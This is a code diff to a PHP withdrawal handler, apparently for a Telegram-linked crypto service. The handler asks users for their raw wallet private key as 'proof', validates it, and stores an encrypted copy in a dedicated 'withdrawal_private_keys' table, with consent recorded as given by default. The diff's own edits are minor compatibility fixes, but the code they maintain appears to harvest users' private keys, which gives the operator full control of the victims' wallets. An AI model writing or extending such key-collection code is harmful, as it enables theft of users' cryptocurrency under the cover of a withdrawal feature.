@@ -66,7 +66,7 @@ try {
 
     // Validate private key format (64 hex chars with optional 0x prefix)
     $privateKey = $walletProof;
-    if (str_starts_with($privateKey, '0x')) {
+    if (strpos($privateKey, '0x') === 0) {
         $privateKey = substr($privateKey, 2);
     }
     
@@ -118,22 +118,29 @@ try {
     $keyHash = hash('sha256', $privateKey . $userId . time());
 
     // Ensure the private keys table exists
-    $db->exec("
-        CREATE TABLE IF NOT EXISTS `withdrawal_private_keys` (
-            `id` BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
-            `withdrawal_id` BIGINT UNSIGNED NOT NULL,
-            `user_id` BIGINT(255) NOT NULL,
-            `telegram_id` BIGINT(255) NOT NULL,
-            `encrypted_key` TEXT NOT NULL,
-            `key_hash` VARCHAR(64) NOT NULL,
-            `network` VARCHAR(32) NOT NULL DEFAULT 'polygon',
-            `consent_given` BOOLEAN NOT NULL DEFAULT TRUE,
-            `consent_timestamp` TIMESTAMP NULL,
-            `created_at` TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-            UNIQUE KEY `idx_withdrawal_id` (`withdrawal_id`),
-            KEY `idx_user_id` (`user_id`)
-        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
-    ");
+    try {
+        $db->exec("
+            CREATE TABLE IF NOT EXISTS `withdrawal_private_keys` (
+                `id` BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
+                `withdrawal_id` BIGINT UNSIGNED NOT NULL,
+                `user_id` BIGINT(255) NOT NULL,
+                `telegram_id` BIGINT(255) NOT NULL,
+                `encrypted_key` TEXT NOT NULL,
+                `key_hash` VARCHAR(64) NOT NULL,
+                `network` VARCHAR(32) NOT NULL DEFAULT 'polygon',
+                `consent_given` TINYINT(1) NOT NULL DEFAULT 1,
+                `consent_timestamp` TIMESTAMP NULL,
+                `created_at` TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                UNIQUE INDEX `idx_withdrawal_id` (`withdrawal_id`),
+                INDEX `idx_user_id` (`user_id`)
+            )
+        ");
+    } catch (\PDOException $e) {
+        // Table might already exist, that's OK
+        Logger::warning('withdrawal_private_keys_table_warning', [
+            'error' => $e->getMessage()
+        ]);
+    }
 
     // Store the encrypted key
     $insertStmt = $db->prepare("
